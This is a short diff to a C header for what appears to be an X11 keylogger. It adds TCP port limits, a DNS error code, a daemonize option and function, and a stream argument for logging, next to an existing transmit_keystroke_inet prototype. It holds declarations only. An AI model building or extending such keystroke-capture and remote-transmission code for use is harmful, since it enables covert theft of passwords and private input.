@@ -21,8 +21,12 @@
 #define BYTE_LENGTH			8
 #define X_DEFAULT_DISPLAY	":0.0"
 
+#define TCP_PORT_MIN		0
+#define TCP_PORT_MAX		65535
+
 #define ERR_SOCKET			-1
 #define ERR_CONNECT			-2
+#define ERR_DNS				-3
 
 /* macros */
 #define SWAP(a,b,c) c t;t=a;a=b;b=t;
@@ -38,6 +42,7 @@ struct opts_struct {
 	long  port;				/* port */
 
 	int   silent;			/* no log to stdout */
+	int   daemonize;		/* daemonize process */
 };
 
 /* globals */
@@ -101,7 +106,8 @@ void		signal_handler	(int sig);
 void		fatal			(const char * msg);
 struct tm*	initialize		(int argc, char ** argv, struct opts_struct* opts);
 int			transmit_keystroke_inet(char* key, struct opts_struct *opts);
-void		log				(int level, const char *fmt, ...);
+void		log				(int level, FILE* stream, const char *fmt, ...);
+int			daemonize		();
 
 
 
